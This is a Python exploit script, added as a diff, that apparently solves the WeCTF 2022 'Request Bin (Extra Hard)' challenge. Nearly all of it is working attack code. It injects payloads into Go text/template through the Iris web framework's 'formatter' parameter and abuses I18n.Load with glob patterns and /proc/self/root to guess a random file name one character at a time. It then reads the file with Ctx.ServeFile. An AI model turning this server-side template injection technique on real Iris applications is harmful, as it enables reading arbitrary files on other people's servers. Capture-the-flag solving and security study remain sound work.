@@ -1,0 +1,86 @@
+# WeCTF 2022 ( https://github.com/wectf/2022 )
+# Request Bin (Extra Hard)
+# 4 solves / 2526 pts
+
+# SSTI for Go's text/template with Iris web framework
+# - Iris: https://github.com/kataras/iris
+# - text/template: https://pkg.go.dev/text/template
+
+# The goal is getting the random file name (`/$(uuidgen)-$(uuidgen)`) and printing the flag.
+
+import httpx
+import urllib
+
+BASE_URL = "http://80.endpoint-a1800e56ad2244838af66460f97ac5ed.m.ins.cloud.dasctf.com:81/"
+# BASE_URL = "http://nlmlbpltcorlkzamsnmhbiynwigiqcmi.g2.ctf.so"
+
+
+def is_ok(filename: str) -> bool:
+    # E.g. filename == "e9ae21d2-226a-45e7-a039-5???????????-????????-????-????-????-????????????"
+    # `?` is used as an arbitrary character in Glob.
+
+    payload = ""
+    # https://github.com/kataras/iris/blob/v12.2.0-beta3/context/application.go#L16
+    payload += '{{ $app := .Ctx.Application }}'
+    # https://github.com/kataras/iris/blob/v12.2.0-beta3/i18n/i18n.go#L131
+    # This function uses Glob. You can judge the prefix of the file name using Glob and `/proc/self/root`.
+    payload += '{{ $app.I18n.Load "/proc/self/root/{{FILENAME}}" }}'.replace('{{FILENAME}}', filename)
+
+    url = f"{BASE_URL}/start?formatter=" + urllib.parse.quote(payload)
+
+    res = httpx.get(
+        url,
+        follow_redirects=True,
+    )
+    # https://github.com/kataras/iris/blob/v12.2.0-beta3/i18n/loader.go#L97
+    # If the prefix hits, Iris loads the file as a yaml file and fail it. Then, Iris prints a error message.
+    return "line 1: cannot unmarshal" in res.text
+
+
+N = 14
+xs = [None] * N
+
+CHARS = "0123456789abcdefghijklmnopqrstuvwxyz"  # characters of uuid
+for i in range(N):
+    ys = []
+    k = 0
+    cur = None
+    for j in range(N):
+        if j == i:
+            cur = len(ys)
+        if j < i:
+            ys.append(xs[j])
+        else:
+            ys.append("?")
+
+    hit_c = None
+    for c in CHARS:
+        ys[cur] = c
+        filename = "".join(ys)
+
+        if is_ok(filename):
+            hit_c = c
+            break
+
+    assert hit_c != None
+    xs[i] = hit_c
+    print(filename)
+
+
+filename = ""
+k = 0
+for j in range(N):
+    filename += xs[j]
+filename = "".join(ys)
+print(filename)  # Get the file name of `/$(uuidgen)-$(uuidgen)`
+
+
+# https://github.com/kataras/iris/blob/v12.2.0-beta3/context/context.go#L5128
+payload = '{{ .Ctx.ServeFile "/{{FILENAME}}" }}'.replace('{{FILENAME}}', filename)
+
+url = f"{BASE_URL}/start?formatter=" + urllib.parse.quote(payload)
+res = httpx.get(
+    url,
+    follow_redirects=True,
+)
+print(res.text)  # Get a flag!
